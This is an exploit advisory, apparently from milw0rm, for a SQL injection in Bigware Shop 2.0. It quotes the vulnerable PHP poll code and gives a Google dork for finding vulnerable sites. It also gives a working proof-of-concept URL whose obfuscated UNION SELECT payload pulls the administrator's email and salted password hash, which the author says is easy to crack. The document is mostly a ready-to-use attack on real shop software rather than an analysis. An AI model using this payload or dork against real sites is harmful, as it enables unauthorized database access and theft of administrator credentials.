@@ -1,0 +1,49 @@
+###########################
+###Bigware Shop 2.0########
+#####################################################################
+# Bug found by D4m14n  
+# Vendor: http://www.bigware.de/
+# Vuln. Version: 2.0 (prior versions also may be affected)
+# Email: delta-1@secure-mail.net
+#
+# GoogleDork: "Diese Shopsoftware wurde entwickelt von Bigware"
+#####################################################################
+
+There's a SQL-Injection in "main_bigware_53.tpl.php"!
+You can find more than this Injection in the Sourcecode (RFI,SQL-Injections).
+
+#####################################################################
+Sourcecode:
+if (!isset($_GET['op'])) {
+    $_GET['op']="list";
+    }
+switch ($_GET['op']) {
+    case "results":
+        if (isset($_GET['pollid'])) {
+            $pollid=$_GET['pollid'];
+        } else {
+        $pollid=1;
+        }
+              $poll_query = go_db_query("SELECT pollid, timeStamp FROM phesis_poll_desc WHERE pollid='".$pollid."'");    
+              $polls = go_db_fetch_array($poll_query);
+                      $title_query = go_db_query("select optionText from phesis_poll_data where pollid=$pollid and voteid='0' and language_id = '" . $languages_id . "'");
+                      $title = go_db_fetch_array($title_query);
+
+#####################################################################
+Proof-of-Concept:
+
+main_bigware_53.php?op=results&pollid=-1/**/and/**/voteid=0/**/and/**/language_id=5/**/and/**/1=1/**/UnIOn/**/SeLeCt/**/ConCat(former_email_address,0x3a,former_password)/**/FrOM/**/former/**/WhEre/**/former_id=1/*
+
+#####################################################################
+
+You can see the Admins Email-Adress and his SALTED passwordhash (cracking this hash is very easy)
+
+#####################################################################
+
+If you are searching for a Coder, who searches Security-Holes in your Web-Applications,
+feel free to contact me!
+GreetZ 2 Shadowleet and some more ;)
+
+PS: Immer wenn mir langweilig ist, dann veröffentliche ich Sicherheitslücken... 
+
+# milw0rm.com [2008-01-29]
